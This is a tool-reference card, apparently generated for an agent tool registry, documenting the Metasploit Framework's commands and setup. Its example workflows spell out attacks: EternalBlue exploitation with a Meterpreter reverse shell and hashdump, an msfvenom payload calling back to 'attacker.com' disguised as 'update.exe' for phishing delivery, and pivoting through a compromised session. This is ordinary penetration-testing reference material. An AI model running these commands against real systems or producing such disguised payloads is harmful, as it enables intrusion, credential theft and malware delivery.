---
name: Metasploit Framework
description: "Metasploit Framework: modular exploitation platform with 1600+
  exploits, payloads, and auxiliary modules for penetration testing."
registry: registry
tool_id: metasploit
category: exploitation
tags:
  - exploitation
  - payload-generation
  - post-exploitation
  - vulnerability-scanning
  - meterpreter
  - framework
  - ruby
mitre_techniques:
  - T1046
  - T1059
  - T1068
  - T1203
  - T1210
  - T1569
  - T1071
  - T1090
summary: "Metasploit is a Ruby-based exploitation framework accessed via
  `msfconsole`. Use it to search and execute exploits, generate payloads,
  perform post-exploitation, and manage sessions. Launch with
  `/usr/bin/msfconsole` (add `-q` for quiet mode). Core workflow: `search` for
  modules by CVE/name/platform → `use <module>` to load → `show options` to see
  required params → `set RHOSTS/LHOST/LPORT` → `run` or `exploit`. Modules are
  categorized as exploit/, auxiliary/ (scanners, fuzzers), payload/, post/,
  encoder/, nop/. Use `sessions -l` to list active sessions, `sessions -i <id>`
  to interact. Generate standalone payloads with `msfvenom -p <payload>
  LHOST=<ip> LPORT=<port> -f <format> -o <file>`. Database support stores
  results; initialize with `msfdb init`. Commands are context-aware: global
  commands work everywhere, module-specific options appear after `use`. Use
  `back` to exit module context, `jobs -l` to list background tasks, `handler`
  to spawn listeners. Check module info with `info <module>`. Supports
  workspaces for project isolation. Does NOT automatically evade
  detection—default payloads are signatured. Clean exits with `exit -y` or
  graceful session termination. Framework updates constantly; modules may
  change. Verbose mode (`-v`) aids debugging."
sources:
  - https://www.hackthebox.com/blog/metasploit-tutorial
  - https://www.varonis.com/blog/what-is-metasploit
  - https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
  - https://www.kea.nu/files/textbooks/humblesec/metasploit_apenetrationtestersguide.pdf
  - https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html
  - https://www.kali.org/tools/metasploit-framework/
  - https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
  - https://docs.rapid7.com/metasploit/managing-metasploit/
  - https://www.offsec.com/metasploit-unleashed/msfconsole/
  - https://help.rapid7.com/metasploit/Content/getting-started/gsg-msf.html
  - https://docs.hacken.io/methodologies/red-team/
  - https://bishopfox.com/blog/2025-red-team-tools-c2-frameworks-active-directory-network-exploitation
generated_at: 2026-05-19T11:02:50.996Z
generated_by: anthropic
source_hash: a596ebb2b863d7b903fe1cc9651c5a4041d523e625245210f6dfce30c803932a
---

# Metasploit Framework

## Overview

Metasploit Framework is an open-source penetration testing platform providing exploit modules, payloads, auxiliary tools, and post-exploitation capabilities. It abstracts exploit development through a modular architecture with 1677+ exploits across 25+ platforms (Windows, Linux, Android, web apps). Primary interface is `msfconsole`, an interactive Ruby console. Also includes `msfvenom` for standalone payload generation. Maintained by Rapid7 with community contributions; updated daily. Modules organized hierarchically: exploit/ (active exploitation), auxiliary/ (scanners, DoS, fuzzers), payload/ (code to run on target), post/ (post-exploitation), encoder/ (evasion), nop/ (buffer alignment).

## When to use

Use Metasploit when you need to: (1) exploit known vulnerabilities with proven code rather than writing custom exploits, (2) generate shellcode or standalone executables for phishing/client-side attacks, (3) perform post-exploitation (credential harvesting, lateral movement, privilege escalation) via Meterpreter sessions, (4) run auxiliary scanners (port scans, service enumeration, brute force) integrated with exploitation workflow, (5) test detection capabilities with well-known attack signatures, (6) manage multiple active sessions from centralized console. Do NOT use for: zero-day development (framework focuses on published exploits), primary reconnaissance (dedicated OSINT tools are faster), stealth operations without heavy customization (signatures are well-known), or as sole exploitation method (limited to module catalog).

## Authentication & setup

Metasploit requires no authentication for local use. Database integration (PostgreSQL) is optional but recommended for tracking results and managing workspaces. On Kali Linux (pre-installed): run `msfdb init` to initialize database, then `msfconsole` to launch. Verify database connection inside console with `db_status`. If not connected, check PostgreSQL service is running. First-time launch may require `bundle install` to fetch Ruby gem dependencies. Configuration file: load custom configs with `msfconsole -c <file>`. Module paths: add custom modules with `-m <path>` or set in console with `loadpath <dir>`. No credentials needed unless connecting to remote Metasploit RPC or Pro instances. Database stores hosts, services, vulnerabilities, loot, sessions—persist across console restarts. Use `workspace` command to create isolated project environments within database.

## Key commands / parameters

**Global commands**: `help` (list commands), `search <keyword>` (find modules; filters: `cve:`, `platform:`, `type:`, `author:`), `use <module>` (load module), `back` (exit module), `info <module>` (show details), `show <exploits|payloads|auxiliary|options|targets>` (list available items), `set <VAR> <value>` (set option), `setg` (set global), `unset/unsetg` (clear), `save` (persist settings), `run`/`exploit` (execute module), `check` (test if target vulnerable without exploiting), `sessions <-l|-i id|-K>` (list/interact/kill sessions), `jobs <-l|-k id>` (manage background jobs), `db_nmap <args>` (run nmap with DB import), `services`/`hosts`/`vulns` (query DB), `workspace <-a|-d> <name>` (manage projects), `connect <host> <port>` (netcat-like), `route add <subnet> <mask> <session>` (pivot), `handler -p <payload> -H <lhost> -P <lport>` (spawn listener). **Module context**: `show options` (required/advanced settings), `show targets` (if multi-target exploit), `show payloads` (compatible payloads), `set PAYLOAD <name>`, `set RHOSTS <target>`, `set LHOST <attacker_ip>`, `set LPORT <port>`, `set RPORT <target_port>`, `exploit -j` (background job), `exploit -z` (no interaction). **msfvenom** (external): `msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <exe|elf|python|raw|etc> -o <outfile>` (add `-e <encoder> -i <iterations>` for evasion, `-b <badchars>` to avoid bytes).

## Example workflows

**1. Exploit known vulnerability**: `search cve:2017-0144` → `use exploit/windows/smb/ms17_010_eternalblue` → `show options` → `set RHOSTS 192.168.1.50` → `set PAYLOAD windows/x64/meterpreter/reverse_tcp` → `set LHOST 192.168.1.10` → `set LPORT 4444` → `check` (verify vulnerable) → `exploit`. On success, Meterpreter session opens: `sysinfo`, `getuid`, `hashdump`, `shell`. **2. Port scanning + exploitation**: `db_nmap -sV -p- 192.168.1.0/24` → `services -p 445` (filter SMB) → `hosts -c address,os_name` → `use auxiliary/scanner/smb/smb_version` → `set RHOSTS file:/tmp/targets.txt` → `run`. Review `vulns` table, select exploit. **3. Generate malicious payload**: `msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f exe -o update.exe` → `msfconsole` → `use exploit/multi/handler` → `set PAYLOAD windows/meterpreter/reverse_https` → `set LHOST 0.0.0.0` → `set LPORT 443` → `exploit -j` (background listener). Deliver update.exe via phishing. **4. Post-exploitation pivot**: Session 1 on 192.168.1.50 → `route add 10.10.10.0 255.255.255.0 1` → `use auxiliary/scanner/portscan/tcp` → `set RHOSTS 10.10.10.0/24` → `run` (scan internal network through session). **5. Multi-session management**: `sessions -l` → `sessions -C 'sysinfo'` (run command on all) → `sessions -K` (kill all).

## Output format

**Console output**: Text-based with color coding (disable with `--no-color`). Module execution shows `[+]` for success, `[-]` for failure, `[*]` for info, `[!]` for warnings. Verbose output available with `set VERBOSE true`. **Database queries**: Tabular output from `hosts`, `services`, `vulns`, `loot`, `creds` commands. Export with `hosts -o <file>` or `db_export <file>`. **Search results**: Table with Name, Disclosure Date, Rank (excellent/great/good/normal/average/low), Check (Yes/No), Description. Sort with `search -s <rank|date|name>`, reverse with `-r`. **Session interaction**: Meterpreter sessions provide structured commands (`sysinfo` returns JSON-like key-value, `ps` returns process table). Shell sessions are raw command output. **msfvenom**: Binary payload to specified file or stdout. Use `-f raw` for shellcode bytes. **Log files**: Session transcripts and command history saved to `~/.msf4/logs/` and `~/.msf4/history`. Framework log in `~/.msf4/logs/framework.log`. Capture console output with `spool <file>`.

## Common pitfalls

**1. LHOST misconfiguration**: Setting LHOST to 127.0.0.1 or internal IP when target needs public/NAT IP—reverse shells fail. Use externally routable address or set up port forwarding. **2. Payload mismatch**: Selecting staged payload (e.g., `windows/meterpreter/reverse_tcp`) for restricted environments—requires two-stage connection. Use stageless (`windows/meterpreter_reverse_tcp`) for strict firewalls. **3. Missing RHOSTS**: Forgetting to set target—module fails silently or shows 'no target' error. Always verify with `show options` before running. **4. Database not initialized**: Running `db_nmap` or workspace commands without `msfdb init`—data not persisted, imports fail. Check `db_status`. **5. Session death**: Meterpreter sessions timeout or crash on incompatible commands (e.g., `migrate` to wrong architecture). Set `AutoRunScript` carefully; use `sessions -i <id>` to check status before interacting. **6. Module not found after update**: Framework updated but modules not refreshed—run `reload_all` or restart console. **7. Handler not matching payload**: Exploit uses `reverse_tcp`, handler listens for `bind_tcp`—connection fails. Ensure exact payload match. **8. BadChars in payload**: Exploit requires shellcode without null bytes, but default payload includes them—use `msfvenom -b '\x00'` or encoder. **9. Firewall blocking LPORT**: Reverse connection attempts fail—verify listener port is reachable from target (test with `nc -lvnp <port>`). **10. Forgetting `exploit -j`**: Running long-running module in foreground—locks console. Use `-j` for jobs, manage with `jobs` command.

## References

• https://www.hackthebox.com/blog/metasploit-tutorial
• https://www.varonis.com/blog/what-is-metasploit
• https://www.freecodecamp.org/news/learn-metasploit-for-beginners/
• https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
• https://www.offsec.com/metasploit-unleashed/msfconsole/
• https://help.rapid7.com/metasploit/Content/getting-started/gsg-pro.html
• https://help.rapid7.com/metasploit/Content/getting-started/gsg-msf.html
• https://docs.rapid7.com/metasploit/managing-metasploit/
• https://www.kali.org/tools/metasploit-framework/
